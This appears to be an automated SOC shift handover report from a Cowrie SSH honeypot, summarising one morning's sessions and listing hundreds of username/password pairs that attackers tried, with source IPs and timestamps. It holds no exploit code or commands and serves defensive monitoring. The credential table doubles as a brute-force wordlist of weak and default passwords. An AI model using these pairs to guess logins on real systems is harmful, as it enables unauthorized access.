# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-15 |
| **Generated At** | 2026-08-15T08:34:05Z |
| **Shift Time** | 08:34 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **6728** |
| Confirmed Threats | **6699** |
| False Positives Filtered | **29** (0.4%) |
| Unique Attacker IPs | **83** |
| Countries of Origin | **31** |
| High Severity Cases | **354** |
| Medium Severity Cases | **1** |
| Low Severity Cases | **6373** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **371** |
| Unique Credential Pairs | **302** |
| Unique Usernames | **57** |
| Unique Passwords | **215** |
| Successful Auth Pairs | **362** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 77 |
| `user1` | 38 |
| `user` | 36 |
| `test` | 36 |
| `admin` | 24 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `1qaz@WSX` | 7 |
| `qwerty12` | 7 |
| `654321` | 6 |
| `123qwe` | 5 |
| `ZAQ!XSW@` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `blank` | `qwerty12` | 6 |
| `config` | `654321` | 5 |
| `345gs5662d34` | `345gs5662d34` | 4 |
| `support` | `777777` | 4 |
| `support` | `alpine` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `config` | `654321` | `177.135.206.10` | 2026-08-15T04:56:13 |
| `config` | `654321` | `182.75.197.174` | 2026-08-15T04:56:22 |
| `root` | `qwerty` | `92.118.39.14` | 2026-08-15T04:56:59 |
| `support` | `alpine` | `49.124.152.242` | 2026-08-15T04:58:15 |
| `support` | `alpine` | `202.72.196.75` | 2026-08-15T04:58:24 |
| `support` | `alpine` | `183.167.234.154` | 2026-08-15T04:58:30 |
| `user` | `000000` | `108.174.156.122` | 2026-08-15T04:58:49 |
| `345gs5662d34` | `345gs5662d34` | `108.174.156.122` | 2026-08-15T04:58:51 |
| `user` | `3245gs5662d34` | `108.174.156.122` | 2026-08-15T04:58:52 |
| `root` | `root1` | `92.118.39.14` | 2026-08-15T05:00:47 |
| `root` | `54321` | `45.142.193.164` | 2026-08-15T05:01:27 |
| `root` | `Reza@123` | `213.230.111.14` | 2026-08-15T05:04:13 |
| `345gs5662d34` | `345gs5662d34` | `213.230.111.14` | 2026-08-15T05:04:17 |
| `root` | `3245gs5662d34` | `213.230.111.14` | 2026-08-15T05:04:18 |
| `config` | `654321` | `10.0.0.73` | 2026-08-15T05:07:45 |
| `root` | `vyos` | `217.165.22.192` | 2026-08-15T05:09:04 |
| `debian` | `debian99` | `178.178.194.131` | 2026-08-15T05:19:21 |
| `root` | `4321` | `45.142.193.164` | 2026-08-15T05:23:47 |
| `test` | `0000` | `10.0.0.73` | 2026-08-15T05:24:30 |
| `config` | `654321` | `179.189.85.66` | 2026-08-15T05:24:48 |
| `test` | `0000` | `120.224.15.67` | 2026-08-15T05:26:09 |
| `test` | `1q2w3e4r` | `91.92.40.202` | 2026-08-15T05:26:48 |
| `test` | `test12` | `91.92.40.202` | 2026-08-15T05:26:55 |
| `admin` | `123abc` | `91.92.40.202` | 2026-08-15T05:27:00 |
| `unknown` | `unknown123456789` | `91.92.40.202` | 2026-08-15T05:27:05 |
| `test` | `987654321` | `91.92.40.202` | 2026-08-15T05:27:10 |
| `comunicacao` | `123` | `106.13.46.38` | 2026-08-15T05:27:14 |
| `web` | `web` | `91.92.40.202` | 2026-08-15T05:27:15 |
| `345gs5662d34` | `345gs5662d34` | `106.13.46.38` | 2026-08-15T05:27:18 |
| `user1` | `qwe123` | `91.92.40.202` | 2026-08-15T05:27:21 |
| `comunicacao` | `3245gs5662d34` | `106.13.46.38` | 2026-08-15T05:27:21 |
| `user3` | `@abc123` | `91.92.40.202` | 2026-08-15T05:27:26 |
| `user` | `user22` | `91.92.40.202` | 2026-08-15T05:27:32 |
| `dockeruser` | `12345` | `91.92.40.202` | 2026-08-15T05:27:37 |
| `user` | `000` | `91.92.40.202` | 2026-08-15T05:27:42 |
| `user` | `123qwe` | `91.92.40.202` | 2026-08-15T05:27:48 |
| `weblogic` | `weblogic1234567` | `91.92.40.202` | 2026-08-15T05:27:53 |
| `root` | `1992` | `91.92.40.202` | 2026-08-15T05:27:59 |
| `test` | `12` | `91.92.40.202` | 2026-08-15T05:28:04 |
| `test` | `12345` | `91.92.40.202` | 2026-08-15T05:28:10 |
| `root` | `!root` | `92.118.39.50` | 2026-08-15T05:28:11 |
| `user1` | `QAZ@WSX` | `91.92.40.202` | 2026-08-15T05:28:15 |
| `root` | `plxx@#13915417585` | `217.165.22.192` | 2026-08-15T05:28:17 |
| `ubnt` | `ubnt77` | `91.92.40.202` | 2026-08-15T05:28:20 |
| `Root` | `Root2010` | `91.92.40.202` | 2026-08-15T05:28:25 |
| `root` | `Root.1234` | `91.92.40.202` | 2026-08-15T05:28:31 |
| `root` | `@abc123` | `91.92.40.202` | 2026-08-15T05:28:36 |
| `test` | `test!@` | `91.92.40.202` | 2026-08-15T05:28:42 |
| `user2` | `ZAQ!XSW@` | `91.92.40.202` | 2026-08-15T05:28:46 |
| `frank` | `123456` | `91.92.40.202` | 2026-08-15T05:28:52 |
| `root` | `ipscan` | `91.92.40.202` | 2026-08-15T05:28:57 |
| `test` | `1q2w3e4r5t` | `91.92.40.202` | 2026-08-15T05:29:02 |
| `user1` | `user11234` | `91.92.40.202` | 2026-08-15T05:29:08 |
| `test` | `666666` | `91.92.40.202` | 2026-08-15T05:29:13 |
| `weblogic` | `weblogic12` | `91.92.40.202` | 2026-08-15T05:29:18 |
| `admin` | `nosoup4u` | `91.92.40.202` | 2026-08-15T05:29:23 |
| `supervisor` | `letmein` | `91.92.40.202` | 2026-08-15T05:29:29 |
| `nobody` | `nobody8` | `91.92.40.202` | 2026-08-15T05:29:34 |
| `user1` | `password1234567` | `91.92.40.202` | 2026-08-15T05:29:40 |
| `ubnt` | `jackson` | `91.92.40.202` | 2026-08-15T05:29:45 |
| `user3` | `P@$$w0rd` | `91.92.40.202` | 2026-08-15T05:29:50 |
| `config` | `config9` | `91.92.40.202` | 2026-08-15T05:29:55 |
| `user` | `omn` | `91.92.40.202` | 2026-08-15T05:30:01 |
| `user` | `blog` | `91.92.40.202` | 2026-08-15T05:30:06 |
| `nobody` | `webadmin` | `211.247.127.250` | 2026-08-15T05:30:09 |
| `root` | `111111` | `92.118.39.50` | 2026-08-15T05:30:10 |
| `user1` | `user1123` | `91.92.40.202` | 2026-08-15T05:30:11 |
| `opc` | `123456` | `91.92.40.202` | 2026-08-15T05:30:16 |
| `user0` | `1qazxsw2` | `91.92.40.202` | 2026-08-15T05:30:21 |
| `root` | `zcadqe` | `91.92.40.202` | 2026-08-15T05:30:27 |
| `test` | `password12` | `91.92.40.202` | 2026-08-15T05:30:32 |
| `test` | `123123` | `91.92.40.202` | 2026-08-15T05:30:37 |
| `test` | `3rjs1la7qe` | `91.92.40.202` | 2026-08-15T05:30:43 |
| `supervisor` | `supervisor77` | `91.92.40.202` | 2026-08-15T05:30:48 |
| `user2` | `1qaz@wsx` | `91.92.40.202` | 2026-08-15T05:30:53 |
| `root` | `159357` | `91.92.40.202` | 2026-08-15T05:30:58 |
| `arleth` | `arleth` | `91.92.40.202` | 2026-08-15T05:31:04 |
| `web` | `web123456789` | `91.92.40.202` | 2026-08-15T05:31:08 |
| `corrina` | `corrina` | `91.92.40.202` | 2026-08-15T05:31:13 |
| `user3` | `ZAQ!xsw2` | `91.92.40.202` | 2026-08-15T05:31:19 |
| `user2` | `lobby` | `91.92.40.202` | 2026-08-15T05:31:24 |
| `test` | `password1` | `91.92.40.202` | 2026-08-15T05:31:29 |
| `elk` | `elk` | `91.92.40.202` | 2026-08-15T05:31:34 |
| `admin` | `100581` | `91.92.40.202` | 2026-08-15T05:31:39 |
| `rebecca` | `rebecca` | `91.92.40.202` | 2026-08-15T05:31:44 |
| `admin` | `121287` | `91.92.40.202` | 2026-08-15T05:31:50 |
| `testinguser` | `testinguser` | `91.92.40.202` | 2026-08-15T05:31:55 |
| `user3` | `123qwe` | `91.92.40.202` | 2026-08-15T05:32:00 |
| `root` | `dev1234` | `91.92.40.202` | 2026-08-15T05:32:05 |
| `root` | `951951` | `91.92.40.202` | 2026-08-15T05:32:11 |
| `root` | `123123` | `92.118.39.50` | 2026-08-15T05:32:12 |
| `test` | `password123` | `91.92.40.202` | 2026-08-15T05:32:16 |
| `support` | `support` | `176.53.159.196` | 2026-08-15T05:32:17 |
| `guest` | `guest11` | `91.92.40.202` | 2026-08-15T05:32:22 |
| `test` | `0987654321` | `103.103.53.44` | 2026-08-15T05:32:23 |
| `user0` | `1qaz2wsx3edc4rfv` | `91.92.40.202` | 2026-08-15T05:32:26 |
| `almalinux` | `almalinux` | `91.92.40.202` | 2026-08-15T05:32:31 |
| `test` | `0987654321` | `220.93.167.144` | 2026-08-15T05:32:34 |
| `apache` | `apache@123` | `91.92.40.202` | 2026-08-15T05:32:36 |
| `centos` | `centos123` | `91.92.40.202` | 2026-08-15T05:32:42 |
| `web` | `password1234` | `91.92.40.202` | 2026-08-15T05:32:47 |
| `user1` | `zaq!xsw@` | `91.92.40.202` | 2026-08-15T05:32:52 |
| `admin` | `12031981` | `91.92.40.202` | 2026-08-15T05:32:57 |
| `test` | `1q2w3e` | `91.92.40.202` | 2026-08-15T05:33:02 |
| `admin` | `12` | `91.92.40.202` | 2026-08-15T05:33:07 |
| `user2` | `123qwe` | `91.92.40.202` | 2026-08-15T05:33:12 |
| `samurai` | `samurai` | `91.92.40.202` | 2026-08-15T05:33:17 |
| `user` | `11111` | `91.92.40.202` | 2026-08-15T05:33:23 |
| `weblogic` | `QAZ2wsx` | `91.92.40.202` | 2026-08-15T05:33:28 |
| `user3` | `lobby` | `91.92.40.202` | 2026-08-15T05:33:33 |
| `user1` | `user11` | `91.92.40.202` | 2026-08-15T05:33:39 |
| `system` | `OkwKcECs8qJP2Z` | `91.92.40.202` | 2026-08-15T05:33:44 |
| `user` | `user12345678` | `91.92.40.202` | 2026-08-15T05:33:50 |
| `root` | `zaq1xsw2cde3vfr4` | `91.92.40.202` | 2026-08-15T05:33:55 |
| `support` | `qwertyuiop` | `91.92.40.202` | 2026-08-15T05:34:00 |
| `user1` | `1QAZ2WSX` | `91.92.40.202` | 2026-08-15T05:34:05 |
| `user` | `P@$$w0rd` | `91.92.40.202` | 2026-08-15T05:34:11 |
| `root` | `123321` | `92.118.39.50` | 2026-08-15T05:34:13 |
| `user1` | `ZAQ!XSW@` | `91.92.40.202` | 2026-08-15T05:34:16 |
| `user` | `1qaz2wsx3edc` | `91.92.40.202` | 2026-08-15T05:34:21 |
| `user1` | `ZAQ!xsw2` | `91.92.40.202` | 2026-08-15T05:34:27 |
| `root` | `root666` | `91.92.40.202` | 2026-08-15T05:34:32 |
| `test` | `7777777` | `91.92.40.202` | 2026-08-15T05:34:38 |
| `user1` | `omn` | `91.92.40.202` | 2026-08-15T05:34:43 |
| `weblogic` | `password1` | `91.92.40.202` | 2026-08-15T05:34:48 |
| `user` | `zaqxsw` | `91.92.40.202` | 2026-08-15T05:34:54 |
| `user1` | `user1123456` | `91.92.40.202` | 2026-08-15T05:34:59 |
| `user1` | `1234567` | `91.92.40.202` | 2026-08-15T05:35:04 |
| `weblogic` | `password123456789` | `91.92.40.202` | 2026-08-15T05:35:10 |
| `weblogic` | `1qaz@WSX` | `91.92.40.202` | 2026-08-15T05:35:15 |
| `backup` | `123qwe` | `91.92.40.202` | 2026-08-15T05:35:20 |
| `user0` | `ZAQ!XSW@` | `91.92.40.202` | 2026-08-15T05:35:26 |
| `user` | `password1` | `91.92.40.202` | 2026-08-15T05:35:31 |
| `test` | `18atcskd2w` | `91.92.40.202` | 2026-08-15T05:35:37 |
| `user0` | `P@$$w0rd` | `91.92.40.202` | 2026-08-15T05:35:42 |
| `test` | `123321` | `91.92.40.202` | 2026-08-15T05:35:47 |
| `admin` | `default` | `91.92.40.202` | 2026-08-15T05:35:53 |
| `user1` | `user112` | `91.92.40.202` | 2026-08-15T05:35:58 |
| `installer` | `installer` | `91.92.40.202` | 2026-08-15T05:36:03 |
| `support` | `qwerty1234` | `91.92.40.202` | 2026-08-15T05:36:09 |
| `user1` | `1qaz@wsx` | `91.92.40.202` | 2026-08-15T05:36:14 |
| `root` | `1234` | `92.118.39.50` | 2026-08-15T05:36:16 |
| `user1` | `password123456789` | `91.92.40.202` | 2026-08-15T05:36:19 |
| `huawei` | `Huawei12` | `91.92.40.202` | 2026-08-15T05:36:24 |
| `user3` | `zcadqe` | `91.92.40.202` | 2026-08-15T05:36:30 |
| `weblogic` | `123456` | `91.92.40.202` | 2026-08-15T05:36:35 |
| `admin` | `p@ssw0rd` | `91.92.40.202` | 2026-08-15T05:36:41 |
| `user1` | `1qaz321x` | `91.92.40.202` | 2026-08-15T05:36:47 |
| `user1` | `1qaz2wsx3edc4rfv` | `91.92.40.202` | 2026-08-15T05:36:52 |
| `config` | `config77` | `91.92.40.202` | 2026-08-15T05:36:57 |
| `guest` | `qwerty12` | `91.92.40.202` | 2026-08-15T05:37:03 |
| `root` | `D13HH[` | `91.92.40.202` | 2026-08-15T05:37:08 |
| `init` | `init` | `91.92.40.202` | 2026-08-15T05:37:14 |
| `user1` | `1` | `91.92.40.202` | 2026-08-15T05:37:19 |
| `user` | `raspberry` | `91.92.40.202` | 2026-08-15T05:37:25 |
| `user1` | `password123` | `91.92.40.202` | 2026-08-15T05:37:30 |
| `azure` | `1` | `91.92.40.202` | 2026-08-15T05:37:35 |
| `test` | `test1` | `91.92.40.202` | 2026-08-15T05:37:41 |
| `root` | `mynoob` | `91.92.40.202` | 2026-08-15T05:37:46 |
| `patrol` | `patrol` | `91.92.40.202` | 2026-08-15T05:37:52 |
| `test` | `1234` | `91.92.40.202` | 2026-08-15T05:37:57 |
| `user2` | `zcadqe` | `91.92.40.202` | 2026-08-15T05:38:02 |
| `root` | `1234567890qwe` | `91.92.40.202` | 2026-08-15T05:38:07 |
| `user` | `ZAQ!xsw2` | `91.92.40.202` | 2026-08-15T05:38:12 |
| `user` | `1974` | `91.92.40.202` | 2026-08-15T05:38:18 |
| `root` | `12345` | `92.118.39.50` | 2026-08-15T05:38:21 |
| `admin` | `100001` | `91.92.40.202` | 2026-08-15T05:38:23 |
| `administrator` | `admin` | `91.92.40.202` | 2026-08-15T05:38:29 |
| `user2` | `1qaz@WSX` | `91.92.40.202` | 2026-08-15T05:38:34 |
| `user` | `password12` | `91.92.40.202` | 2026-08-15T05:38:40 |
| `victor` | `1` | `91.92.40.202` | 2026-08-15T05:38:45 |
| `user` | `user13` | `91.92.40.202` | 2026-08-15T05:38:49 |
| `nikita` | `nikita` | `91.92.40.202` | 2026-08-15T05:38:55 |
| `web` | `12345678` | `91.92.40.202` | 2026-08-15T05:39:00 |
| `weblogic` | `weblogic123` | `91.92.40.202` | 2026-08-15T05:39:05 |
| `administrator` | `root` | `91.92.40.202` | 2026-08-15T05:39:10 |
| `root` | `1234%^&*` | `91.92.40.202` | 2026-08-15T05:39:15 |
| `user1` | `!QAZ2wsx` | `91.92.40.202` | 2026-08-15T05:39:20 |
| `weblogic` | `1qaz2wsx` | `91.92.40.202` | 2026-08-15T05:39:25 |
| `web` | `password12345678` | `91.92.40.202` | 2026-08-15T05:39:30 |
| `root` | `server@2026` | `91.92.40.202` | 2026-08-15T05:39:36 |
| `user0` | `1qaz2wsx3edc` | `91.92.40.202` | 2026-08-15T05:39:41 |
| `web` | `web1` | `91.92.40.202` | 2026-08-15T05:39:46 |
| `stefani` | `stefani` | `91.92.40.202` | 2026-08-15T05:39:52 |
| `web` | `!QAZ2wsx` | `91.92.40.202` | 2026-08-15T05:39:57 |
| `weblogic` | `weblogic123456` | `91.92.40.202` | 2026-08-15T05:40:02 |
| `aluno` | `aluno` | `91.92.40.202` | 2026-08-15T05:40:07 |
| `weblogic` | `password12` | `91.92.40.202` | 2026-08-15T05:40:13 |
| `admin` | `Abcd1234` | `91.92.40.202` | 2026-08-15T05:40:18 |
| `backup` | `backup1` | `91.92.40.202` | 2026-08-15T05:40:23 |
| `admin` | `110589` | `91.92.40.202` | 2026-08-15T05:40:28 |
| `admin` | `trustix` | `91.92.40.202` | 2026-08-15T05:40:33 |
| `Root` | `444444444` | `91.92.40.202` | 2026-08-15T05:40:38 |
| `user0` | `zcadqe` | `91.92.40.202` | 2026-08-15T05:40:43 |
| `luther` | `luther` | `91.92.40.202` | 2026-08-15T05:40:48 |
| `jason` | `admin` | `91.92.40.202` | 2026-08-15T05:40:53 |
| `user1` | `user11234567` | `91.92.40.202` | 2026-08-15T05:40:58 |
| `user` | `QAZ@WSX` | `91.92.40.202` | 2026-08-15T05:41:04 |
| `user3` | `1qaz@wsx` | `91.92.40.202` | 2026-08-15T05:41:09 |
| `user0` | `1QAZ2WSX` | `91.92.40.202` | 2026-08-15T05:41:15 |
| `user1` | `password12345678` | `91.92.40.202` | 2026-08-15T05:41:20 |
| `user1` | `QAZ2wsx` | `91.92.40.202` | 2026-08-15T05:41:25 |
| `support` | `2222222222` | `91.92.40.202` | 2026-08-15T05:41:31 |
| `julian` | `julian` | `91.92.40.202` | 2026-08-15T05:41:36 |
| `admin` | `admin` | `34.52.159.185` | 2026-08-15T05:41:42 |
| `weblogic` | `weblogic12345678` | `91.92.40.202` | 2026-08-15T05:41:43 |
| `root` | `pfsense` | `91.92.40.202` | 2026-08-15T05:41:47 |
| `test` | `test55` | `91.92.40.202` | 2026-08-15T05:41:52 |
| `weblogic` | `weblogic1234` | `91.92.40.202` | 2026-08-15T05:41:57 |
| `admin` | `100977` | `91.92.40.202` | 2026-08-15T05:42:02 |
| `blank` | `blank22` | `91.92.40.202` | 2026-08-15T05:42:08 |
| `web` | `password` | `91.92.40.202` | 2026-08-15T05:42:13 |
| `test` | `111111` | `91.92.40.202` | 2026-08-15T05:42:18 |
| `web` | `password12` | `91.92.40.202` | 2026-08-15T05:42:24 |
| `test` | `555555` | `91.92.40.202` | 2026-08-15T05:42:29 |
| `root` | `1234567` | `92.118.39.50` | 2026-08-15T05:42:30 |
| `root` | `1qaz321x` | `91.92.40.202` | 2026-08-15T05:42:34 |
| `frappe` | `frappe24` | `91.92.40.202` | 2026-08-15T05:42:39 |
| `user0` | `zaqxsw` | `91.92.40.202` | 2026-08-15T05:42:44 |
| `user` | `1qazxsw2` | `91.92.40.202` | 2026-08-15T05:42:50 |
| `usuario` | `contrasena` | `91.92.40.202` | 2026-08-15T05:42:55 |
| `user1` | `password` | `91.92.40.202` | 2026-08-15T05:43:00 |
| `admin` | `13021981` | `91.92.40.202` | 2026-08-15T05:43:05 |
| `user3` | `1qaz@WSX` | `91.92.40.202` | 2026-08-15T05:43:11 |
| `admin` | `110986` | `91.92.40.202` | 2026-08-15T05:43:16 |
| `babygirl` | `babygirl` | `91.92.40.202` | 2026-08-15T05:43:21 |
| `root` | `12345678` | `92.118.39.50` | 2026-08-15T05:44:33 |
| `root` | `Cloud12345` | `69.6.234.27` | 2026-08-15T05:45:16 |
| `345gs5662d34` | `345gs5662d34` | `69.6.234.27` | 2026-08-15T05:45:18 |
| `root` | `3245gs5662d34` | `69.6.234.27` | 2026-08-15T05:45:19 |
| `root` | `321` | `45.142.193.164` | 2026-08-15T05:46:15 |
| `root` | `123456789` | `92.118.39.50` | 2026-08-15T05:46:39 |
| `user` | `abcd1234` | `10.0.0.73` | 2026-08-15T05:47:31 |
| `deploy` | `deploy123456` | `217.165.22.192` | 2026-08-15T05:47:32 |
| `root` | `1234567890` | `92.118.39.50` | 2026-08-15T05:48:49 |
| `root` | `123456a` | `92.118.39.50` | 2026-08-15T05:50:54 |
| `root` | `123456b` | `92.118.39.50` | 2026-08-15T05:52:50 |
| `root` | `1234abcd` | `92.118.39.50` | 2026-08-15T05:54:51 |
| `root` | `123abc` | `92.118.39.50` | 2026-08-15T05:56:57 |
| `root` | `123qwe` | `92.118.39.50` | 2026-08-15T05:59:00 |
| `root` | `1q2w3e4r` | `92.118.39.50` | 2026-08-15T06:01:01 |
| `root` | `1qaz2wsx` | `92.118.39.50` | 2026-08-15T06:02:52 |
| `blank` | `qwerty12` | `203.75.170.63` | 2026-08-15T06:03:58 |
| `blank` | `qwerty12` | `122.170.99.195` | 2026-08-15T06:04:07 |
| `root` | `1qaz@WSX` | `92.118.39.50` | 2026-08-15T06:04:40 |
| `root` | `21` | `92.118.39.50` | 2026-08-15T06:06:30 |
| `root` | `Root@1234` | `217.165.22.192` | 2026-08-15T06:06:45 |
| `root` | `321` | `92.118.39.50` | 2026-08-15T06:08:27 |
| `root` | `0` | `45.142.193.164` | 2026-08-15T06:08:42 |
| `root` | `4321` | `92.118.39.50` | 2026-08-15T06:10:27 |
| `root` | `54321` | `92.118.39.50` | 2026-08-15T06:12:30 |
| `root` | `555555` | `92.118.39.50` | 2026-08-15T06:14:34 |
| `blank` | `qwerty12` | `10.0.0.73` | 2026-08-15T06:15:31 |
| `user` | `qwerty1234` | `123.123.196.140` | 2026-08-15T06:15:47 |
| `user` | `qwerty1234` | `186.215.107.189` | 2026-08-15T06:15:54 |
| `user` | `public` | `78.189.17.35` | 2026-08-15T06:16:29 |
| `root` | `654321` | `92.118.39.50` | 2026-08-15T06:16:31 |
| `root` | `7777777` | `92.118.39.50` | 2026-08-15T06:18:21 |
| `support` | `support` | `10.0.0.73` | 2026-08-15T06:19:34 |
| `root` | `Admin2026!` | `92.118.39.50` | 2026-08-15T06:20:12 |
| `centos` | `test` | `10.0.0.73` | 2026-08-15T06:21:31 |
| `root` | `P4ssw0rd` | `92.118.39.50` | 2026-08-15T06:22:01 |
| `root` | `P4ssword` | `92.118.39.50` | 2026-08-15T06:23:46 |
| `root` | `P@ssw0rd` | `92.118.39.50` | 2026-08-15T06:25:35 |
| `root` | `Passw0rd` | `217.165.22.192` | 2026-08-15T06:25:59 |
| `root` | `P@ssw0rd2026` | `92.118.39.50` | 2026-08-15T06:27:31 |
| `root` | `P@ssword` | `92.118.39.50` | 2026-08-15T06:29:28 |
| `root` | `00` | `45.142.193.164` | 2026-08-15T06:31:15 |
| `blank` | `qwerty12` | `111.70.32.10` | 2026-08-15T06:32:37 |
| `support` | `777777` | `10.0.0.73` | 2026-08-15T06:32:42 |
| `blank` | `qwerty12` | `1.212.225.99` | 2026-08-15T06:32:46 |
| `support` | `777777` | `27.107.102.154` | 2026-08-15T06:34:19 |
| `support` | `777777` | `49.124.153.33` | 2026-08-15T06:34:30 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `147.185.132.65` | 2026-08-15T06:34:34 |
| `admin` | `admin1234567` | `180.188.253.150` | 2026-08-15T06:38:03 |
| `centos` | `test` | `220.122.115.9` | 2026-08-15T06:40:05 |
| `centos` | `test` | `122.160.15.31` | 2026-08-15T06:40:17 |
| `root` | `redhat` | `217.165.22.192` | 2026-08-15T06:45:13 |
| `test` | `!QAZ2wsx` | `91.92.42.7` | 2026-08-15T06:46:57 |
| `user1` | `zaq!xsw@` | `91.92.42.7` | 2026-08-15T06:47:06 |
| `root` | `1qaz321x` | `91.92.42.7` | 2026-08-15T06:47:14 |
| `user` | `000` | `91.92.42.7` | 2026-08-15T06:47:20 |
| `supervisor` | `supervisor33` | `91.92.42.7` | 2026-08-15T06:47:27 |
| `user` | `omn` | `91.92.42.7` | 2026-08-15T06:47:33 |
| `weblogic` | `password123` | `91.92.42.7` | 2026-08-15T06:47:40 |
| `test` | `test@12345` | `91.92.42.7` | 2026-08-15T06:47:46 |
| `root` | `12344321` | `91.92.42.7` | 2026-08-15T06:47:51 |
| `root` | `google` | `91.92.42.7` | 2026-08-15T06:47:56 |
| `nobody` | `nobody8` | `91.92.42.7` | 2026-08-15T06:48:03 |
| `user1` | `password1234` | `91.92.42.7` | 2026-08-15T06:48:09 |
| `web` | `password` | `91.92.42.7` | 2026-08-15T06:48:16 |
| `root` | `159357` | `91.92.42.7` | 2026-08-15T06:48:22 |
| `user3` | `lobby01` | `91.92.42.7` | 2026-08-15T06:48:27 |
| `user1` | `QAZ2wsx` | `91.92.42.7` | 2026-08-15T06:48:34 |
| `test` | `1qaz2wsx` | `91.92.42.7` | 2026-08-15T06:48:41 |
| `web` | `123456789` | `91.92.42.7` | 2026-08-15T06:48:47 |
| `admin` | `12021974` | `91.92.42.7` | 2026-08-15T06:48:53 |
| `default` | `1q2w3e` | `91.92.42.7` | 2026-08-15T06:48:58 |
| `root` | `Info1` | `91.92.42.7` | 2026-08-15T06:49:04 |
| `user2` | `ZAQ!XSW@` | `91.92.42.7` | 2026-08-15T06:49:10 |
| `web` | `web1234567` | `91.92.42.7` | 2026-08-15T06:49:16 |
| `marion` | `marion` | `91.92.42.7` | 2026-08-15T06:49:24 |
| `user0` | `zaq!xsw@` | `91.92.42.7` | 2026-08-15T06:49:31 |
| `admin` | `admin1234567` | `10.0.0.73` | 2026-08-15T06:49:36 |
| `user` | `1qazxsw2` | `91.92.42.7` | 2026-08-15T06:49:37 |
| `root` | `qazwsx123456789` | `91.92.42.7` | 2026-08-15T06:49:44 |
| `test` | `password1234` | `91.92.42.7` | 2026-08-15T06:49:50 |
| `usuario` | `contrasena` | `91.92.42.7` | 2026-08-15T06:49:56 |
| `almalinux` | `almalinux` | `91.92.42.7` | 2026-08-15T06:50:01 |
| `web` | `1qaz@WSX` | `91.92.42.7` | 2026-08-15T06:50:07 |
| `user0` | `1qaz321x` | `91.92.42.7` | 2026-08-15T06:50:13 |
| `user0` | `user0` | `91.92.42.7` | 2026-08-15T06:50:19 |
| `user1` | `user11` | `91.92.42.7` | 2026-08-15T06:50:25 |
| `user` | `123456654321` | `10.0.0.73` | 2026-08-15T06:50:32 |
| `user1` | `1qaz2wsx3edc4rfv` | `91.92.42.7` | 2026-08-15T06:50:32 |
| `support` | `777777` | `210.177.143.61` | 2026-08-15T06:50:36 |
| `admin` | `admin1` | `91.92.42.7` | 2026-08-15T06:50:37 |
| `admin` | `100977` | `91.92.42.7` | 2026-08-15T06:50:42 |
| `supervisor` | `maintenance` | `91.92.42.7` | 2026-08-15T06:50:48 |
| `user` | `zaqxsw` | `91.92.42.7` | 2026-08-15T06:50:54 |
| `apache` | `apache@123` | `91.92.42.7` | 2026-08-15T06:50:59 |
| `user` | `P@$$w0rd` | `91.92.42.7` | 2026-08-15T06:51:05 |
| `aluno` | `aluno` | `91.92.42.7` | 2026-08-15T06:51:11 |
| `test` | `q1w2e3` | `91.92.42.7` | 2026-08-15T06:51:17 |
| `user2` | `1qaz@wsx` | `91.92.42.7` | 2026-08-15T06:51:23 |
| `corrina` | `corrina` | `91.92.42.7` | 2026-08-15T06:51:28 |
| `weblogic` | `password` | `91.92.42.7` | 2026-08-15T06:51:34 |
| `guest` | `guest11` | `91.92.42.7` | 2026-08-15T06:51:39 |
| `user1` | `!QAZ2wsx` | `91.92.42.7` | 2026-08-15T06:51:46 |
| `user0` | `1qaz@WSX` | `91.92.42.7` | 2026-08-15T06:51:52 |
| `root` | `88888888` | `91.92.42.7` | 2026-08-15T06:51:57 |
| `user` | `1974` | `91.92.42.7` | 2026-08-15T06:52:03 |
| `test` | `3rjs1la7qe` | `91.92.42.7` | 2026-08-15T06:52:09 |
| `user1` | `password` | `91.92.42.7` | 2026-08-15T06:52:16 |
| `test` | `mynoob` | `91.92.42.7` | 2026-08-15T06:52:23 |
| `user3` | `ZAQ!XSW@` | `91.92.42.7` | 2026-08-15T06:52:29 |
| `admin` | `120790` | `91.92.42.7` | 2026-08-15T06:52:35 |
| `test` | `test!@` | `91.92.42.7` | 2026-08-15T06:52:40 |
| `test` | `test12345` | `91.92.42.7` | 2026-08-15T06:52:47 |
| `user1` | `user1123` | `91.92.42.7` | 2026-08-15T06:52:53 |
| `user1` | `zaqxsw` | `91.92.42.7` | 2026-08-15T06:52:59 |
| `user` | `user13` | `91.92.42.7` | 2026-08-15T06:53:05 |
| `user1` | `password123456` | `91.92.42.7` | 2026-08-15T06:53:11 |
| `admin` | `dagmarka1304` | `91.92.42.7` | 2026-08-15T06:53:18 |
| `weblogic` | `1qaz@WSX` | `91.92.42.7` | 2026-08-15T06:53:25 |
| `root` | `temp` | `91.92.42.7` | 2026-08-15T06:53:32 |
| `user1` | `QAZ@WSX` | `91.92.42.7` | 2026-08-15T06:53:39 |
| `user3` | `1qaz3edc` | `91.92.42.7` | 2026-08-15T06:53:44 |
| `root` | `000` | `45.142.193.164` | 2026-08-15T06:53:46 |
| `user` | `11111` | `91.92.42.7` | 2026-08-15T06:53:50 |
| `user1` | `1qaz3edc` | `91.92.42.7` | 2026-08-15T06:53:56 |
| `user` | `raspberry` | `91.92.42.7` | 2026-08-15T06:54:02 |
| `weblogic` | `weblogic12` | `91.92.42.7` | 2026-08-15T06:54:07 |
| `test5` | `qwe123` | `91.92.42.7` | 2026-08-15T06:54:13 |
| `user2` | `1QAZ2WSX` | `91.92.42.7` | 2026-08-15T06:54:19 |
| `patrol` | `patrol` | `91.92.42.7` | 2026-08-15T06:54:26 |
| `root` | `omn` | `91.92.42.7` | 2026-08-15T06:54:31 |
| `config` | `config5` | `91.92.42.7` | 2026-08-15T06:54:37 |
| `user1` | `P@$$w0rd` | `91.92.42.7` | 2026-08-15T06:54:42 |
| `root` | `333` | `91.92.42.7` | 2026-08-15T06:54:48 |
| `user3` | `ZAQ!xsw2` | `91.92.42.7` | 2026-08-15T06:54:54 |
